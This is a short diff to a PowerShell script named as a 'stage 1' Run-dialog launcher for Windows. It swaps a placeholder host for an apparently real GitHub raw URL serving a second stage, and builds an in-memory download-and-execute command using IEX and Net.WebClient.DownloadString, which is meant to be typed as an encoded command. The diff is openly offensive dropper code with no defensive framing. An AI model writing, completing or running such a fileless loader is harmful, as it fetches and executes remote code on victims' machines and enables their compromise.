@@ -1,7 +1,7 @@
 # language: PowerShell, file: s1.ps1, target: Windows 10/11, PS 5.1
 # stage 1 — Run-dialog launcher. Types a -enc download+execute.
 
-$RemoteUrl = "https://your.host/s2.ps1"
+$RemoteUrl = "https://raw.githubusercontent.com/QmFkLVBp/duqndnaidnznhnyf32yfz18nqynmdbmYQBCMB/main/ps1/s2.ps1"
 
 # inner: pull payload to memory and execute
 $Inner = "IEX (New-Object Net.WebClient).DownloadString('$RemoteUrl')"
